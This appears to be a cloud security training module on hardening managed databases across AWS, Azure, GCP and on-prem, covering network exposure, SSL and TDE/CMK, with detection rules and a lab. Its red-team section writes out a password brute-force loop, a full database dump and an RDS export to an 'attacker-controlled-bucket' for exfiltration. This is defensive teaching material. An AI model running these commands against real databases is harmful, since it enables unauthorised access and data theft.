# 06 — Database Network & TDE

> **Level:** Intermediate–Advanced
> **Prereqs:** [04-01 — Object Storage Primitives](./object-storage-primitives.md), [04-03 — Encryption at Rest & CMK](./encryption-at-rest-and-cmek.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access, Credential Access, Collection
> **Authorization scope:** Run only against your own database instances in a sandbox account.

## What & why

Managed cloud databases (RDS, Azure SQL, Cloud SQL) expose SQL endpoints that can be accidentally made internet-facing. Combined with master password reuse or absent TLS enforcement, a public endpoint becomes a direct entry vector. TDE and CMK-backed encryption protect data at rest, but network exposure and credential hygiene are the first lines of defense.

## The OnPrem reality

A SQL Server instance running on a standalone VM, bound to `0.0.0.0:1433`, TDE-encrypted with a local master key stored in the Windows certificate store. The DB admin's workflow: RDP to the jump box, then SQL Management Studio. The firewall blocked port 1433 from the internet, but any lateral movement inside the network meant the database was wide open.

```bash
# OnPrem: SQL Server listening on all interfaces (common misconfig)
netstat -an | grep 1433
# Output: 0.0.0.0:1433 LISTENING
```

## Core concepts

| Aspect | AWS RDS | Azure SQL | GCP Cloud SQL | OnPrem |
|---|---|---|---|---|
| Public endpoint default | Yes (configurable at creation) | No (private by default, but public opt-in) | No (requires authorized networks or Cloud SQL Proxy) | Depends on firewall |
| TDE support | Oracle/SQL Server TDE option; all engines: KMS-encrypted storage | Always on (built-in) | Always on (built-in for Cloud SQL; CMEK optional) | SQL Server TDE / Oracle TDE |
| CMK/BYOK | KMS CMK for storage encryption | Key Vault CMK for TDE protector | Cloud KMS CMEK | Local certificate store |
| Private endpoint | RDS Proxy/VPC endpoint | Private Link | Private IP + Cloud SQL Proxy | Internal NIC only |
| SSL enforcement | `rds.force_ssl` parameter group | `sslEnforcement: Enabled` | `requireSsl` instance flag | Certificate configuration |
| Master password | Generated or user-provided; stored in Secrets Manager recommendation | AAD-only (no master password recommended) | Generated; IAM DB auth recommended | Windows Auth / SQL Auth |

## AWS

**Service:** RDS. **Console path:** `RDS → Databases → <instance> → Connectivity & security`.

```bash
# 1. Create RDS instance WITHOUT public accessibility
aws rds create-db-instance \
  --db-instance-identifier secure-lab-db \
  --db-instance-class db.t3.micro \
  --engine postgres \
  --master-username dbadmin \
  --master-user-password "$(openssl rand -base64 32)" \
  --allocated-storage 20 \
  --storage-encrypted \
  --kms-key-id arn:aws:kms:us-east-1:111111111111:key/00000000-0000-0000-0000-000000000000 \
  --no-publicly-accessible \
  --no-multi-az \
  --vpc-security-group-ids sg-00000000000000000

# 2. Force SSL connections via parameter group (PostgreSQL example)
aws rds modify-db-parameter-group \
  --db-parameter-group-name secure-pg \
  --parameters "ParameterName=rds.force_ssl,ParameterValue=1,ApplyMethod=immediate"

# 3. Verify public accessibility is off
aws rds describe-db-instances \
  --db-instance-identifier secure-lab-db \
  --query "DBInstances[0].PubliclyAccessible"
```

**Terraform:**
```hcl
resource "aws_db_instance" "secure" {
  identifier     = "secure-lab-db"
  engine         = "postgres"
  instance_class = "db.t3.micro"
  username       = "dbadmin"
  password       = random_password.db.result

  storage_encrypted   = true
  kms_key_id          = aws_kms_key.db.arn
  publicly_accessible = false
  skip_final_snapshot = true

  vpc_security_group_ids = [aws_security_group.db.id]
}

resource "aws_db_parameter_group" "ssl" {
  name   = "secure-pg"
  family = "postgres14"

  parameter {
    name  = "rds.force_ssl"
    value = "1"
  }
}
```

**Gotcha:** `publicly_accessible` defaults to `false` in Terraform but `true` in the console quick-create wizard. Always pin this explicitly. The `storage_encrypted` flag can only be set at creation; you cannot encrypt an existing unencrypted RDS instance without a snapshot-restore migration.

## Azure

**Service:** Azure SQL Database. **Console path:** `SQL databases → <db> → Networking`.

```bash
# 1. Create Azure SQL with public access disabled
az sql server create \
  --name sql-secure-lab-00000000 \
  --resource-group rg-security-lab \
  --location eastus \
  --admin-user dbadmin \
  --admin-password "$(openssl rand -base64 32)" \
  --enable-public-network false

# 2. Enforce TLS 1.2 and disable public endpoint
az sql server update \
  --name sql-secure-lab-00000000 \
  --resource-group rg-security-lab \
  --minimal-tls-version 1.2

# 3. Enable AAD-only auth (removes SQL admin entirely)
az sql server ad-admin create \
  --resource-group rg-security-lab \
  --server sql-secure-lab-00000000 \
  --display-name "DB Admins Group" \
  --object-id 00000000-0000-0000-0000-000000000000

# 4. Enable TDE with CMK from Key Vault
az sql server key create \
  --resource-group rg-security-lab \
  --server sql-secure-lab-00000000 \
  --kid "https://kv-security-lab-00000000.vault.azure.net/keys/db-cmk/00000000000000000000000000000000"
az sql server tde-key set \
  --resource-group rg-security-lab \
  --server sql-secure-lab-00000000 \
  --server-key-type AzureKeyVault \
  --kid "https://kv-security-lab-00000000.vault.azure.net/keys/db-cmk/00000000000000000000000000000000"
```

**Terraform:**
```hcl
resource "azurerm_mssql_server" "lab" {
  name                         = "sql-secure-lab-00000000"
  resource_group_name          = azurerm_resource_group.lab.name
  location                     = "eastus"
  administrator_login          = "dbadmin"
  administrator_login_password = random_password.db.result

  public_network_access_enabled      = false
  minimum_tls_version                = "1.2"
  azuread_authentication_only        = true
}

resource "azurerm_mssql_transparent_data_encryption" "lab" {
  server_id = azurerm_mssql_server.lab.id
  key_vault_key_id = azurerm_key_vault_key.db.id
}
```

**Gotcha:** Azure SQL's `public_network_access_enabled = false` is the single most important security setting — it forces all connections through Private Link or the VNet firewall. Master password authentication can be completely eliminated with `azuread_authentication_only = true`.

## GCP

**Service:** Cloud SQL. **Console path:** `SQL → <instance> → Connections`.

```bash
# 1. Create Cloud SQL with private IP only
gcloud sql instances create secure-lab-db \
  --database-version=POSTGRES_14 \
  --tier=db-f1-micro \
  --region=us-east1 \
  --storage-size=10 \
  --storage-type=SSD \
  --no-assign-ip \
  --network=default \
  --require-ssl

# 2. Enable CMEK on the instance
gcloud sql instances create secure-lab-db-cmek \
  --database-version=POSTGRES_14 \
  --tier=db-f1-micro \
  --region=us-east1 \
  --disk-encryption-key=projects/example-project/locations/us-east1/keyRings/db-keyring/cryptoKeys/db-cmek \
  --no-assign-ip \
  --require-ssl

# 3. Verify SSL enforcement
gcloud sql instances describe secure-lab-db \
  --format="value(settings.ipConfiguration.requireSsl)"
```

**Cloud SQL Proxy (IAP-wrapped access):**
```bash
# Cloud SQL Proxy provides IAM-authenticated local connection tunnel
./cloud-sql-proxy --private-ip example-project:us-east1:secure-lab-db

# Then connect via localhost — no firewall rules needed
psql "host=127.0.0.1 port=5432 dbname=postgres user=iam-user"
```

**Terraform:**
```hcl
resource "google_sql_database_instance" "lab" {
  name             = "secure-lab-db"
  database_version = "POSTGRES_14"
  region           = "us-east1"

  deletion_protection = true

  settings {
    tier              = "db-f1-micro"
    disk_size         = 10
    availability_type = "ZONAL"

    ip_configuration {
      ipv4_enabled    = false
      private_network = google_compute_network.lab.id
      require_ssl     = true
    }

    disk_encryption_configuration {
      kms_key_name = google_kms_crypto_key.db.id
    }
  }
}
```

**Gotcha:** `ipv4_enabled = false` with `private_network` set makes the instance accessible only via VPC or Cloud SQL Proxy — no public IP. Cloud SQL Proxy provides IAM-authenticated tunneling without opening firewall rules, the strongest network posture.

## OnPrem mapping

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Prevent public endpoint | Firewall deny:1433 | `PubliclyAccessible=false` + SG | `public_network_access_enabled=false` | `ipv4_enabled=false` + private network |
| Force SSL | SQL Server Configuration Manager → Force Encryption | `rds.force_ssl` parameter group | `minimum_tls_version=1.2` | `requireSsl=true` |
| BYOK/TDE | SQL Server TDE + EKM module | KMS CMK for storage encryption | Key Vault CMK for TDE protector | CMEK on disk encryption |
| IAM auth (no master password) | Kerberos / Windows Auth | RDS IAM auth | AAD-only admin | Cloud SQL IAM auth |
| Audit login failures | SQL error log | CloudWatch Logs / RDS Enhanced Monitoring | Azure SQL Auditing → Log Analytics | Cloud SQL audit logs |

## 🔴 Red Team view

A public-facing database with reused master credentials is one of the simplest cloud entry vectors:

```bash
# Attacker discovers public RDS endpoint (via Shodan, port scan, or leaked connection string)
# Contained example — connecting to a local test DB, not a real target
psql "host=localhost port=5432 dbname=postgres user=dbadmin password=Password123!" -c "\l"

# Attack sequence:
# 1. Discovery phase — resolve the RDS endpoint
nslookup secure-lab-db.cluster-00000000.us-east-1.rds.amazonaws.com
# Output: public IP address — confirms public accessibility

# 2. Credential brute-force / credential stuffing
for PASS in $(cat common-passwords.txt); do
  psql "host=secure-lab-db.cluster-00000000.us-east-1.rds.amazonaws.com \
        port=5432 dbname=postgres user=dbadmin password=$PASS" \
        -c "SELECT 1" 2>/dev/null && echo "FOUND: $PASS" && break
done

# 3. Post-compromise: dump all databases
pg_dumpall -h secure-lab-db.cluster-00000000.us-east-1.rds.amazonaws.com \
  -U dbadmin > /tmp/rds_dump.sql

# 4. Enable RDS export to S3 for bulk exfiltration (if authorized)
aws rds start-export-task \
  --export-task-identifier exfil \
  --source-arn arn:aws:rds:us-east-1:111111111111:cluster:secure-lab-db \
  --s3-bucket-name attacker-controlled-bucket \
  --iam-role-arn arn:aws:iam::111111111111:role/rds-s3-export \
  --kms-key-id alias/aws/rds
```

**Azure equivalent vulnerability:**
```bash
# SQL Server on public endpoint
sqlcmd -S sql-secure-lab-00000000.database.windows.net -U dbadmin -P 'Password123!'
```

**Artifacts left:** Database audit logs record connection attempts from unexpected IPs. RDS logs show `FATAL: password authentication failed` for brute-force attempts. CloudTrail records `rds:StartExportTask` if export-to-S3 is used. The `pg_stat_statements` view (if enabled) would show bulk `pg_dumpall` table scans.

## 🔵 Blue Team view

**Preventive controls:**
```bash
# AWS: SCP denying RDS creation without encryption + no public access
aws organizations create-policy \
  --name DenyPublicRDS \
  --type SERVICE_CONTROL_POLICY \
  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":["rds:CreateDBInstance","rds:ModifyDBInstance"],"Resource":["*"],"Condition":{"Bool":{"rds:PubliclyAccessible":true}}}]}'

# GCP: Org Policy requiring SSL on Cloud SQL
gcloud resource-manager org-policies set-policy \
  --organization=000000000000 \
  --constraint=constraints/sql.restrictPublicIp \
  policy-enforce.yaml
```

**Detection queries:**
```sql
-- AWS CloudTrail: RDS set to public
SELECT eventTime, userIdentity.arn, requestParameters.publiclyAccessible
FROM cloudtrail_logs
WHERE eventName IN ('CreateDBInstance', 'ModifyDBInstance')
  AND requestParameters.publiclyAccessible = 'true'

-- AWS RDS logs: connection from unknown IP
SELECT timestamp, remote_host, message
FROM rds_postgres_log
WHERE message LIKE '%connection received%'
  AND remote_host NOT IN ('10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16')
```

```kusto
// Azure SQL: connection from non-Azure IP
AzureDiagnostics
| where ResourceType == "SQLSECURITY"
| where Category == "SQLSecurityAuditEvents"
| where action_name == "DATABASE AUTHENTICATION FAILED"
| project TimeGenerated, server_principal_name, client_ip, application_name
```

```sql
-- GCP: Cloud SQL instance with public IP
SELECT timestamp, protoPayload.resourceName
FROM `project-id.cloud_audit_logs._AllLogs`
WHERE protoPayload.methodName IN ("cloudsql.instances.create", "cloudsql.instances.update")
  AND protoPayload.request.body.settings.ipConfiguration.ipv4Enabled = true
```

**Response:**
1. If public endpoint is found: modify the instance to `publicly_accessible=false` / `public_network_access_enabled=false`.
2. Force password rotation for the master user immediately.
3. Enable GuardDuty RDS protection / Azure Defender for SQL / GCP Security Command Center.
4. Review database audit logs for the period the instance was public — look for successful logins from unexpected IPs.

## Hands-on lab

1. Create a free-tier RDS / Azure SQL / Cloud SQL instance with `publicly_accessible=false`.
2. Attempt to connect from outside the VPC — verify it fails.
3. Temporarily (in your sandbox only) enable public access and connect — verify it works.
4. Re-disable public access, enable SSL enforcement, and connect via SSL — verify the connection is encrypted (`\conninfo` in psql, `Encrypt=True` in SQL Server).
5. Enable audit logging on the database.
6. **Teardown:** Delete the database instance (skip final snapshot).

**Expected output:** Connection fails with public access disabled. SSL connection shows encryption parameters. Audit logs capture all connection attempts.

## Detection rules & checklists

```yaml
# Sigma rule — Cloud DB instance made public
title: Cloud Database Instance Publicly Accessible
status: experimental
logsource:
  product: cloud
  service: managed_database
detection:
  selection_aws:
    eventName: ['CreateDBInstance', 'ModifyDBInstance']
    requestParameters.publiclyAccessible: 'true'
  selection_azure:
    OperationNameValue: 'Microsoft.Sql/servers/write'
    Properties.publicNetworkAccess: 'Enabled'
  selection_gcp:
    methodName: ['cloudsql.instances.create', 'cloudsql.instances.update']
    protoPayload.request.body.settings.ipConfiguration.ipv4Enabled: true
  condition: selection_aws or selection_azure or selection_gcp
level: critical
```

```bash
# AWS: list all RDS instances with public accessibility
aws rds describe-db-instances \
  --query "DBInstances[?PubliclyAccessible==\`true\`].{ID:DBInstanceIdentifier,Endpoint:Endpoint.Address}" \
  --output table

# Azure: list all SQL servers with public network access
az sql server list --query "[?publicNetworkAccess=='Enabled'].{Name:name, RG:resourceGroup}" -o table

# GCP: list Cloud SQL instances with public IP
gcloud sql instances list --format="table(name, ipAddresses[0].ipAddress)"
```

## References

- [AWS RDS Security Best Practices](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html)
- [Azure SQL Database security](https://learn.microsoft.com/en-us/azure/azure-sql/database/security-best-practice)
- [GCP Cloud SQL security](https://cloud.google.com/sql/docs/postgres/security)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- Cross-ref: [04-03 — Encryption at Rest & CMK](./encryption-at-rest-and-cmek.md) for KMS depth
